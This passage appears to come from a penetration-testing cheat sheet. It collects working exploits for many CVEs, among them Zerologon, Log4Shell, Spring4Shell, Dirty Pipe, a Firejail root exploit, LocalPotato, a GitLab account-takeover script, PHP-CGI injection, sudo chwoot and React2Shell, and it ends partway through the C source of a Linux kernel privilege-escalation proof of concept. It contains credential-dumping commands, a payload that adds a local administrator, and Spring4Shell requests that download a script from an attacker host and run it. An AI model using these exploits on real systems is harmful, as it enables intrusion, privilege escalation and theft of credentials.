    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until successfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```

##### Execution

```shell
python3 zerologon_tester.py <HANDLE> <RHOST>
impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
```

```shell
impacket-secretsdump '<DOMAIN>'/'<RHOST>$'@<RHOST> -no-pass
```

#### CVE-2021-3156: Sudo / sudoedit LPE

> https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435

##### Prerequisistes

- Ubuntu 20.04 (Sudo 1.8.31)
- Debian 10 (Sudo 1.8.27)
- Fedora 33 (Sudo 1.9.2)
- All legacy versions >= 1.8.2 to 1.8.31p2 and all stable versions >= 1.9.0 to 1.9.5p1

##### Vulnerability Test

```shell
sudoedit -s /
```

The machine is vulnerable if one of the following message is shown.

```shell
sudoedit: /: not a regular file
segfault
```

Not vulnerable if the error message starts with `usage:`.

#### CVE-2021-42287: NoPac LPE

> https://github.com/Ridter/noPac

```shell
python3 noPac.py '<DOMAIN>'/'<USERNAME>':'<PASSWORD>' -dc-ip <RHOST> -shell --impersonate 'Administrator' -use-ldap
```

#### CVE-2021-44228: Log4Shell RCE (0-day)

> https://github.com/welk1n/JNDI-Injection-Exploit

```shell
wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```

```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<COMMAND>"
```

```shell
${jndi:ldap://<LHOST>:1389/ci1dfd}
```

##### Alternatively

> https://github.com/kozmer/log4j-shell-poc

**Prerequisistes**

> https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

```shell
tar -xvf jdk-8u20-linux-x64.tar.gz
```

##### Start the Listener

```shell
python poc.py --userip <LHOST> --webport <RPORT> --lport <LPORT>
```

**Execution**

```shell
${jndi:ldap://<LHOST>:1389/foobar}
```

#### CVE-2022-0847: Dirty Pipe LPE

```shell
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 ootz:
su rootz
```

#### CVE-2022-22963: Spring4Shell RCE (0-day)

> https://github.com/me2nuk/CVE-2022-22963

```shell
curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
```

```shell
curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
```

#### CVE-2022-31214: Firejail LPE

> https://seclists.org/oss-sec/2022/q2/188

> https://www.openwall.com/lists/oss-security/2022/06/08/10

```python
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner () suse com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

##### First Terminal

```shell
./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

##### Second Terminal

```shell
firejail --join=193982
su
```

#### CVE-2023-21746: Windows NTLM EoP LocalPotato LPE

> https://github.com/decoder-it/LocalPotato

> https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc

Modify the following file and build the solution.

```shell
StorSvc\RpcClient\RpcClient\storsvc_c.c
```

```shell
#if defined(_M_AMD64)
//#define WIN10
//#define WIN11
#define WIN2019
//#define WIN2022
```

```shell
StorSvc\SprintCSP\SprintCSP\main.c
```

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

First get the `paths` from the `environment`, then use `LocalPotato` to place the `malicious DLL`.

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path
LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll
```

At least trigger `StorSvc` via `RpcClient.exe`.

```cmd
.\RpcClient.exe
```

#### CVE-2023-22809: Sudo Bypass

> https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466

**Prerequisites**

- Sudo version needs to be ≥ 1.8 and < 1.9.12p2.
- Limited Sudo access to at least one file on the system that requires root access.

##### Example

```shell
test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
```

**Exploitation**

```shell
EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
```

```shell
sudoedit /etc/motd
```

#### CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)

- Linux ubuntu2204 5.19.0-46-generic

```shell
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

#### CVE-2023-4911: Looney Tunables LPE

```shell
python3 gen_libc.py
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```shell
gcc -o exp exp.c
./exp
```

#### CVE-2023-7028: GitLab Account Takeover

> https://github.com/V1lu0/CVE-2023-7028

> https://github.com/Vozec/CVE-2023-7028

##### PoC

```shell
user[email][]=<EMAIL>&user[email][]=<EMAIL>
```

##### Modified PoC from TryHackMe

```python
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
		evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
```

**Execution**

```shell
python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
```

#### CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE

```python
"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber)
Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
"""

banner = """			 __         ___  ___________
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|
				  \\/          \\/     \\/

        watchTowr-vs-php_cve-2024-4577.py
        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
          - Aliz Hammond, watchTowr (<EMAIL>)
          - Sina Kheirkhah (@SinSinology), watchTowr (<EMAIL>)
        CVEs: [CVE-2024-4577]  """


import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False



res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
```

#### CVE-2025-29927: Next.js Authentication Bypass

##### Payloads

```shell
X-Middleware-Subrequest: middleware
```

```shell
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

**Execution**

```shell
curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
```

#### CVE-2025-32463: chwoot sudo LPE

```bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

#### CVE-2025-55182: React2Shell RCE

**Prerequisistes**

- React 19.0.0, 19.1.0, 19.1.1, and 19.2.0
- Next.js versions ≥14.3.0-canary.77, all 15.x, and 16.x releases prior to patching
- Other frameworks using RSC: React Router (RSC mode), Waku, Redwood SDK, and various RSC plugins

##### Proof of Concept (PoC)

```shell
POST / HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
Content-Disposition: form-data; name="1"

"$@0"
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

#### CVE-2026-24061: GNU Inetutils telnetd RCE

- GNU InetUtils 1.9.3 > 2.7

```shell
USER="-f root" telnet -a localhost
```

#### CVE-2026-46300: Fragnesia Universal Linux LPE

##### Compiling

```shell
$ gcc -O2 -w fragnesia.c -o exp
```

**Execution**

Drop out of the root shell to regular user and execute `/usr/bin/su` with the corrupted `page cache`.

```shell
$ /usr/bin/su
```

##### Drop Page Cache for Cleanup

```shell
$ sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

**Proof of Concept (PoC)**

```c
// Fragnesia: universal Linux LPE
// Ubuntu users: AppArmor interferes with using namespaces, you need to use
// `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`.
//
// You can chain other bugs to bypass this requirement but this is out of scope for this vulnerability.
//
// Found with V12 by William Bowling on the V12 team
// V12 - https://v12.sh - dangerously powerful agentic security

// Patch: https://lists.openwall.net/netdev/2026/05/13/79

/*
 * Slim ESP-in-TCP/TCP-coalesce page-cache replacement PoC.
 *
 * It only targets an already prepared disposable regular file under /tmp or
 * /var/tmp.  The file must be readable by the caller and should be non-writable
 * to demonstrate the permission boundary.
 *
 * Build:
 *   gcc -O2 -Wall -Wextra -static xfrm_espintcp_pagecache_replace.c -o xfrm_espintcp_pagecache_replace
 *
 * Run:
 *   ./xfrm_espintcp_pagecache_replace /tmp/root-owned-copy 0 42434445
 *
 * Exit codes:
 *   1: vulnerable behavior verified
 *   0: fixed/no mutation observed
 *   2: local setup or argument error
 *   4: namespace/XFRM gate closed
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#if __has_include(<linux/if_alg.h>)
#include <linux/if_alg.h>
#else
#include <linux/types.h>
struct sockaddr_alg {
	__u16 salg_family;
	__u8 salg_type[14];
	__u32 salg_feat;
	__u32 salg_mask;
	__u8 salg_name[64];
};
#endif
#include <linux/netlink.h>
#include <linux/udp.h>
#include <linux/xfrm.h>
#include <limits.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef NETLINK_XFRM
#define NETLINK_XFRM 6
#endif

#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif

#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif

#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#define FRAG_LEN 4096
#define ESP_GCM_ICV_LEN 16
#define ESP_GCM_ENCRYPTED_LEN (FRAG_LEN - ESP_GCM_ICV_LEN)
#define TCP_PORT 5556

#define PAYLOAD_LEN         192
#define FRAME_PAYLOAD_ROWS  12      /* ceil(PAYLOAD_LEN / 16) */
#define FRAME_BAR_W         50
#define FRAME_LINES         15      /* 1 header + 12 hex + 1 bar + 1 sep */

#define RECEIVER_PRE_ULP_US 30000
#define SENDER_PRE_SPLICE_US 1000
#define RECEIVER_POST_ULP_US 30000

static const unsigned char xfrm_aead_key[20] = {
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04
};

static unsigned char active_esp_gcm_iv[8] = {
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};
static uint32_t active_esp_seq = 1;
static const char *target_file;
static char target_file_buf[PATH_MAX];
static loff_t target_splice_off;

static uint16_t stream0_nonce[256];
static bool stream0_have[256];

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(2);
}

static void gate_fail(const char *what)
{
	printf("namespace_gate_failed: %s errno=%d (%s)\n",
	       what, errno, strerror(errno));
	exit(4);
}

static void store_be32(unsigned char *p, uint32_t v)
{
	p[0] = (unsigned char)(v >> 24);
	p[1] = (unsigned char)(v >> 16);
	p[2] = (unsigned char)(v >> 8);
	p[3] = (unsigned char)v;
}

/* ANSI colours */
#define C_RESET  "\033[0m"
#define C_BOLD   "\033[1m"
#define C_DIM    "\033[2m"
#define C_RED    "\033[31m"
#define C_GREEN  "\033[32m"
#define C_YELLOW "\033[33m"
#define C_CYAN   "\033[36m"
#define C_WHITE  "\033[97m"
#define C_BRED   "\033[1;31m"
#define C_BGRN   "\033[1;32m"
#define C_BYLW   "\033[1;33m"
#define C_BCYN   "\033[1;36m"
#define C_BWHT   "\033[1;97m"

static void print_hex_bytes(const char *label, const unsigned char *buf,
			    size_t len)
{
	size_t i;

	printf(C_DIM "%s=" C_RESET C_CYAN, label);
	for (i = 0; i < len; i++)
		printf("%02x", buf[i]);
	printf(C_RESET "\n");
}

/* Dump a 16-byte aligned row centred on `highlight_off`, marking that byte. */
static void print_hex_row(const char *path, uint64_t highlight_off,
			  const char *before_label, unsigned char before_val,
			  const char *after_label,  unsigned char after_val)
{
	uint64_t row_start = highlight_off & ~(uint64_t)15;
	unsigned char row[16];
	ssize_t got;
	size_t col;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	got = pread(fd, row, sizeof(row), (off_t)row_start);
	close(fd);
	if (got <= 0)
		return;

	/* Hex section */
	printf(C_DIM "  %016llx  " C_RESET, (unsigned long long)row_start);
	for (col = 0; col < 16; col++) {
		if (col == 8)
			printf(" ");
		if ((size_t)got > col) {
			if (row_start + col == highlight_off)
				printf(C_BRED "[%02x]" C_RESET, row[col]);
			else
				printf(C_DIM "%02x " C_RESET, row[col]);
		} else {
			printf(C_DIM "   " C_RESET);
		}
	}

	/* ASCII section */
	printf("  " C_DIM "|" C_RESET);
	for (col = 0; col < (size_t)got; col++) {
		unsigned char c = row[col];
		if (row_start + col == highlight_off)
			printf(C_BRED "%c" C_RESET,
			       (c >= 0x20 && c < 0x7f) ? c : '.');
		else
			printf(C_DIM "%c" C_RESET,
			       (c >= 0x20 && c < 0x7f) ? c : '.');
	}
	printf(C_DIM "|" C_RESET "\n");

	/* Annotation line */
	size_t col_off = (size_t)(highlight_off - row_start);
	size_t arrow_pos = 20 + col_off * 3 + (col_off >= 8 ? 1 : 0) + 1;
	printf("%*s" C_BYLW "^-- +%04llx  "
	       C_RED "%s" C_RESET ":" C_BRED "%02x" C_RESET
	       "  ->  "
	       C_GREEN "%s" C_RESET ":" C_BGRN "%02x" C_RESET "\n",
	       (int)arrow_pos, "",
	       (unsigned long long)(highlight_off & 0xffff),
	       before_label, before_val,
	       after_label, after_val);
}

static int open_afalg_aes_ecb(void)
{
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
	};
	int fd;

	fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("socket(AF_ALG)");

	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "ecb(aes)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind AF_ALG ecb(aes)");
	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_aead_key, 16) < 0)
		die("setsockopt AF_ALG key");

	return fd;
}

static void afalg_aes_encrypt_block(int alg_fd, const unsigned char in[16],
				    unsigned char out[16])
{
	char cbuf[CMSG_SPACE(sizeof(uint32_t))] = {};
	struct iovec iov = {
		.iov_base = (void *)in,
		.iov_len = 16,
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = cbuf,
		.msg_controllen = sizeof(cbuf),
	};
	struct cmsghdr *cmsg;
	uint32_t op = ALG_OP_ENCRYPT;
	ssize_t ret;
	int op_fd;

	op_fd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
	if (op_fd < 0)
		die("accept AF_ALG");

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(op));
	memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

	ret = sendmsg(op_fd, &msg, 0);
	if (ret != 16)
		die("sendmsg AF_ALG block");
	ret = read(op_fd, out, 16);
	if (ret != 16)
		die("read AF_ALG block");

	close(op_fd);
}

static unsigned char aes_gcm_stream0_byte(int alg_fd,
					  const unsigned char iv[8])
{
	unsigned char counter_block[16], stream[16];

	memcpy(counter_block, &xfrm_aead_key[16], 4);
	memcpy(counter_block + 4, iv, 8);
	store_be32(counter_block + 12, 2);
	afalg_aes_encrypt_block(alg_fd, counter_block, stream);
	return stream[0];
}

static void build_stream0_table(void)
{
	unsigned char iv[8] = {
		0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
	};
